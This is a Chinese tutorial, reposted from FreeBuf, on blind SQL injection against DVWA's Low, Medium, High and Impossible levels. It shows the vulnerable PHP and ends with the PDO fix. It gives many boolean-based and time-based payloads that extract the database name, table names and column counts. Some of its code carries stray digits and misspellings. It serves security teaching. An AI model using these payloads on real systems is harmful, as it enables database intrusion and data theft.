****SQL Injection****(Blind)****
--------------------------------

SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

### ****手工****盲注****思路****

手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。

下面简要介绍手工盲注的步骤（可与之前的[手工注入](http://www.freebuf.com/articles/web/120747.html)作比较）：

> 1.判断是否存在注入，注入是字符型还是数字型
> 
> 2.猜解当前数据库名
> 
> 3.猜解数据库中的表名
> 
> 4.猜解表中的字段名
> 
> 5.猜解数据

下面对四种级别的代码进行分析。

****Low****
-----------

服务器端核心代码

```
<?php        
if( isset( $_GET[ 'Submit' ] ) ) {       
    // Get input       
    $id = $_GET[ 'id' ];        
    // Check database       
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";       
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors        1
    // Get results       1
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors       1
    if( $num > 0 ) {       1
        // Feedback for end user       1
        echo '<pre>User ID exists in the database.</pre>';       1
    }       1
    else {       1
        // User wasn't found, so the page wasn't!       1
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );        2
        // Feedback for end user       2
        echo '<pre>User ID is MISSING from the database.</pre>';       2
    }        2
    mysql_close();       2
}        2
?>
```


可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，‘

```
User ID exists in the database.
```


‘与‘

```
`User ID is MISSING from the database.`
```


‘，因此这里是SQL盲注漏洞。

### ****漏洞利用****

首先演示**基于布尔的盲注**：

### **1.判断是否存在注入，注入是字符型还是数字型**

输入1，显示相应用户存在：

[![1.png](http://image.3001.net/images/20161124/14799581497051.png!small)](http://image.3001.net/images/20161124/14799581497051.png)

输入1’ and 1=1 #，显示存在：

[![1.png](http://image.3001.net/images/20161124/14799581792824.png!small)](http://image.3001.net/images/20161124/14799581792824.png)

输入1’ and 1=2 #，显示不存在：

[![1.png](http://image.3001.net/images/20161124/14799582098311.png!small)](http://image.3001.net/images/20161124/14799582098311.png)

说明存在字符型的SQL盲注。

### **2.猜解当前数据库名**

想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。

> 输入1’ and length(database())=1 #，显示不存在；
> 
> 输入1’ and length(database())=2 #，显示不存在；
> 
> 输入1’ and length(database())=3 #，显示不存在；
> 
> 输入1’ and length(database())=4 #，显示存在：

说明数据库名长度为4。

下面采用二分法猜解数据库名。

> 输入1’ and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
> 
> 输入1’ and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
> 
> 输入1’ and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
> 
> 输入1’ and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
> 
> 输入1’ and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
> 
> 输入1’ and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
> 
> …

重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。

### **3.猜解数据库中的表名**

首先猜解数据库中表的数量：

> 1’ and (select count (table\_name) from information\_schema.tables where table\_schema=database())=1 # 显示不存在
> 
> 1’ and (select count (table\_name) from information\_schema.tables where table\_schema=database() )=2 # 显示存在

说明数据库中共有两个表。

接着挨个猜解表名：

> 1’ and length(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=1 # 显示不存在
> 
> 1’ and length(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=2 # 显示不存在
> 
> …
> 
> 1’ and length(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=9 # 显示存在

说明第一个表名长度为9。

> 1’ and ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1,1))>97 # 显示存在
> 
> 1’ and ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1,1))<122 # 显示存在
> 
> 1’ and ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1,1))<109 # 显示存在
> 
> 1’ and ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1,1))<103 # 显示不存在
> 
> 1’ and ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1,1))>103 # 显示不存在

说明第一个表的名字的第一个字符为小写字母g。

…

重复上述步骤，即可猜解出两个表名（guestbook、users）。

### **4.猜解表中的字段名**

首先猜解表中字段的数量：

> 1’ and (select count(column\_name) from information\_schema.columns where table\_name= ’users’)=1 # 显示不存在
> 
> …
> 
> 1’ and (select count(column\_name) from information\_schema.columns where table\_name= ’users’)=8 # 显示存在

说明users表有8个字段。

接着挨个猜解字段名：

> 1’ and length(substr((select column\_name from information\_schema.columns where table\_name= ’users’ limit 0,1),1))=1 # 显示不存在
> 
> …
> 
> 1’ and length(substr((select column\_name from information\_schema.columns where table\_name= ’users’ limit 0,1),1))=7 # 显示存在

说明users表的第一个字段为7个字符长度。

采用二分法，即可猜解出所有字段名。

### **5.猜解数据**

同样采用二分法。

还可以使用**基于时间的盲注**：

### **1.判断是否存在注入，注入是字符型还是数字型**

> 输入1’ and sleep(5) #，感觉到明显延迟；
> 
> 输入1 and sleep(5) #，没有延迟；

说明存在字符型的基于时间的盲注。

### **2.猜解当前数据库名**

首先猜解数据名的长度：

> 1’ and if(length(database())=1,sleep(5),1) # 没有延迟
> 
> 1’ and if(length(database())=2,sleep(5),1) # 没有延迟
> 
> 1’ and if(length(database())=3,sleep(5),1) # 没有延迟
> 
> 1’ and if(length(database())=4,sleep(5),1) # 明显延迟

说明数据库名长度为4个字符。

接着采用二分法猜解数据库名：

> 1’ and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟
> 
> …
> 
> 1’ and if(ascii(substr(database(),1,1))<100,sleep(5),1)# 没有延迟
> 
> 1’ and if(ascii(substr(database(),1,1))>100,sleep(5),1)# 没有延迟
> 
> 说明数据库名的第一个字符为小写字母d。
> 
> …

重复上述步骤，即可猜解出数据库名。

### **3.猜解数据库中的表名**

首先猜解数据库中表的数量：

> 1’ and if((select count(table\_name) from information\_schema.tables where table\_schema=database() )=1,sleep(5),1)# 没有延迟
> 
> 1’ and if((select count(table\_name) from information\_schema.tables where table\_schema=database() )=2,sleep(5),1)# 明显延迟

说明数据库中有两个表。

接着挨个猜解表名：

> 1’ and if(length(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟
> 
> …
> 
> 1’ and if(length(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟

说明第一个表名的长度为9个字符。

采用二分法即可猜解出表名。

### **4.猜解表中的字段名**

首先猜解表中字段的数量：

> 1’ and if((select count(column\_name) from information\_schema.columns where table\_name= ’users’)=1,sleep(5),1)# 没有延迟
> 
> …
> 
> 1’ and if((select count(column\_name) from information\_schema.columns where table\_name= ’users’)=8,sleep(5),1)# 明显延迟

说明users表中有8个字段。

接着挨个猜解字段名：

> 1’ and if(length(substr((select column\_name from information\_schema.columns where table\_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟
> 
> …
> 
> 1’ and if(length(substr((select column\_name from information\_schema.columns where table\_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟

说明users表的第一个字段长度为7个字符。

采用二分法即可猜解出各个字段名。

### **5.猜解数据**

同样采用二分法。

****Medium****
--------------

服务器端核心代码 

```
<?php        
if( isset( $_POST[ 'Submit' ]  ) ) {       
    // Get input       
    $id = $_POST[ 'id' ];       
    $id = mysql_real_escape_string( $id );        
    // Check database       
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";       1
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors        1
    // Get results       1
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors       1
    if( $num > 0 ) {       1
        // Feedback for end user       1
        echo '<pre>User ID exists in the database.</pre>';       1
    }       1
    else {       1
        // Feedback for end user       2
        echo '<pre>User ID is MISSING from the database.</pre>';       2
    }        2
    //mysql_close();       2
}        2
?>
```


可以看到，Medium级别的代码利用mysql\_real\_escape\_string函数对特殊符号

\\x00,\\n,\\r,\\,’,”,\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

[![1.png](http://image.3001.net/images/20161124/14799583709041.png!small)](http://image.3001.net/images/20161124/14799583709041.png)

### ****漏洞利用****

虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。

之前已经介绍了详细的盲注流程，这里就简要演示几个。

首先是**基于布尔的盲注**：

> 抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；
> 
> 抓包改参数id为1 and length(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；
> 
> 抓包改参数id为1 and (select count(column\_name) from information\_schema.columns where table\_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。

然后是**基于时间的盲注**：

> 抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；
> 
> 抓包改参数id为1 and if(length(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；
> 
> 抓包改参数id为1 and if((select count(column\_name) from information\_schema.columns where table\_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。

****High****
------------

服务器端核心代码

```
<?php        
if( isset( $_COOKIE[ 'id' ] ) ) {       
    // Get input       
    $id = $_COOKIE[ 'id' ];        
    // Check database       
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";       
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors        1
    // Get results       1
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors       1
    if( $num > 0 ) {       1
        // Feedback for end user       1
        echo '<pre>User ID exists in the database.</pre>';       1
    }       1
    else {       1
        // Might sleep a random amount       1
        if( rand( 0, 5 ) == 3 ) {       2
            sleep( rand( 2, 4 ) );       2
        }        2
        // User wasn't found, so the page wasn't!       2
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );        2
        // Feedback for end user       2
        echo '<pre>User ID is MISSING from the database.</pre>';       2
    }        3
    mysql_close();       3
}        3
?>
```


可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

### ****漏洞利用****

虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示**基于布尔的盲注**：

> 抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；
> 
> 抓包将cookie中参数id改为1’ and length(substr(( select table\_name from information\_schema.tables where table\_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；
> 
> 抓包将cookie中参数id改为1’ and (select count(column\_name) from information\_schema.columns where table\_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。

****Impossible****
------------------

服务器端核心代码

```
<?php        
if( isset( $_GET[ 'Submit' ] ) ) {       
    // Check Anti-CSRF token       
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );        
    // Get input       
    $id = $_GET[ 'id' ];        1
    // Was a number entered?       1
    if(is_numeric( $id )) {       1
        // Check the database       1
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );       1
        $data->bindParam( ':id', $id, PDO::PARAM_INT );       1
        $data->execute();        1
        // Get results       1
        if( $data->rowCount() == 1 ) {       1
            // Feedback for end user       2
            echo '<pre>User ID exists in the database.</pre>';       2
        }       2
        else {       2
            // User wasn't found, so the page wasn't!       2
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );        2
            // Feedback for end user       2
            echo '<pre>User ID is MISSING from the database.</pre>';       2
        }       2
    }       3
}        3
// Generate Anti-CSRF token       3
generateSessionToken();        3
?>
```


可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。

**\*本文原创作者：lonehand**

**转自：[http://www.freebuf.com/articles/web/120985.html](http://www.freebuf.com/articles/web/120985.html)**